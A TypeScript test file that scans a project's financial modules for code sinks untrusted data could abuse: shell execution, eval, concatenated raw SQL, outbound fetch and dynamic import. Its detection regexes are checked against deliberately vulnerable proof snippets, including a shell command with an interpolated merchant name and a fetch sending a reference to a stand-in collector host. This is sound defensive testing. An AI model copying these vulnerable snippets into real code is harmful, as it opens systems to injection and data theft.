// THE WHOLE PHASE 5 FINANCIAL SURFACE, SCANNED FOR WAYS TO ACT.
//
// `modules/statement-imports` already scans itself. That proved one module and
// left six, plus the HTTP layer, unscanned — and the boundary is only as good
// as the least-scanned file behind it. Untrusted narrative flows through every
// one of these trees: a merchant name read from a CSV reaches the transactions
// module, the categorisation evaluator, the transfer generator and the API's
// serialisers.
//
// The scan is for SINKS, not for content. It does not look for dangerous
// strings in data; it looks for code that could give data a way to act. That
// is the same distinction the trust model draws: `'; DROP TABLE` is a merchant
// name, and the thing that would make it dangerous is a query built by
// concatenation, which is what this refuses to let exist.
//
// Each rule carries a `proof` — source that MUST match — and `permitted`
// samples that must NOT. A scan whose pattern silently stopped matching would
// otherwise pass forever.
import { readdirSync, readFileSync, statSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { describe, expect, it } from 'vitest';

const REPO = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../..');

/** Every tree Phase 5 financial data flows through, on the server. */
const SCANNED_TREES = [
  'modules/financial-accounts',
  'modules/financial-connections',
  'modules/payment-instruments',
  'modules/statement-imports',
  'modules/transactions',
  'modules/transfer-matching',
  'apps/api/src/financial',
] as const;

interface ForbiddenShape {
  readonly what: string;
  readonly pattern: RegExp;
  /** Source that MUST match, so the rule is proven to still bite. */
  readonly proof: string;
  /** Source that must NOT match, so the rule is proven not to over-reach. */
  readonly permitted: readonly string[];
}

const FORBIDDEN: readonly ForbiddenShape[] = [
  {
    what: 'a shell or a child process',
    pattern: /\bnode:child_process\b|\b(?:execSync|execFileSync|spawnSync|execFile|spawn)\s*\(/,
    proof: 'const out = execSync(`grep ${merchant} ledger.txt`);',
    permitted: ['const match = SHAPE.exec(value);', 'await this.repository.update(actor, next);'],
  },
  {
    what: 'an evaluator',
    pattern: /\beval\s*\(|new\s+Function\s*\(|\bnode:vm\b/,
    proof: 'const amount = eval(row.fields[2]);',
    permitted: [
      'const parsed = new Date(value);',
      'const evaluator = new MerchantRuleEvaluator(x);',
    ],
  },
  {
    what: 'a query built by concatenation',
    pattern: /\$queryRawUnsafe|\$executeRawUnsafe|Prisma\s*\.\s*raw\s*\(/,
    proof: "await tx.$queryRawUnsafe(`SELECT * FROM t WHERE m = '${merchant}'`);",
    // Prisma's tagged template BINDS its interpolations; it is the safe form.
    permitted: ['await tx.$executeRaw`INSERT INTO platform.outbox_events (id) VALUES (${id})`;'],
  },
  {
    what: 'an outbound network call',
    pattern: /\bfetch\s*\(|\bnode:https?\b|\baxios\b|\bgot\s*\(|new\s+Request\s*\(/,
    proof: 'await fetch(`https://collector.invalid/${reference}`);',
    permitted: [
      'const request = this.buildRequest(input);',
      'await this.outbox.record(tx, event);',
    ],
  },
  {
    what: 'a dynamic import or module resolution',
    pattern: /\brequire\s*\(\s*[^'"]|import\s*\(\s*[^'"]/,
    proof: 'const plugin = await import(row.merchant);',
    permitted: ["import { Money } from '@karar/shared-kernel';", "await import('./fixed.js');"],
  },
];

/** Production TypeScript only: a test may legitimately do all of these. */
function productionSources(tree: string): string[] {
  const root = path.join(REPO, tree);
  const found: string[] = [];
  const walk = (dir: string): void => {
    for (const entry of readdirSync(dir)) {
      const full = path.join(dir, entry);
      if (statSync(full).isDirectory()) {
        if (entry === 'dist' || entry === 'node_modules' || entry === '__tests__') continue;
        walk(full);
        continue;
      }
      if (!entry.endsWith('.ts') || entry.endsWith('.test.ts')) continue;
      found.push(full);
    }
  };
  walk(root);
  return found;
}

/** Comments describe what the code refuses to do; they are not code. */
function stripComments(source: string): string {
  return source.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
}

describe('the financial surface gives untrusted content no way to act', () => {
  const files = SCANNED_TREES.flatMap((tree) => productionSources(tree));

  it('scans a surface that actually exists', () => {
    // A scan over an empty file list passes every rule below in silence.
    expect(files.length).toBeGreaterThan(150);
    for (const tree of SCANNED_TREES) {
      expect(productionSources(tree).length, tree).toBeGreaterThan(0);
    }
  });

  for (const shape of FORBIDDEN) {
    it(`contains no ${shape.what}`, () => {
      const offenders: string[] = [];
      for (const file of files) {
        const source = stripComments(readFileSync(file, 'utf8'));
        if (shape.pattern.test(source)) offenders.push(path.relative(REPO, file));
      }
      expect(offenders, `${shape.what} reached the financial surface`).toEqual([]);
    });

    it(`would notice ${shape.what} if it appeared`, () => {
      // The rule bites…
      expect(shape.pattern.test(shape.proof), shape.proof).toBe(true);
      // …and does not fire on the shapes this code legitimately uses.
      for (const allowed of shape.permitted) {
        expect(shape.pattern.test(allowed), allowed).toBe(false);
      }
    });
  }
});
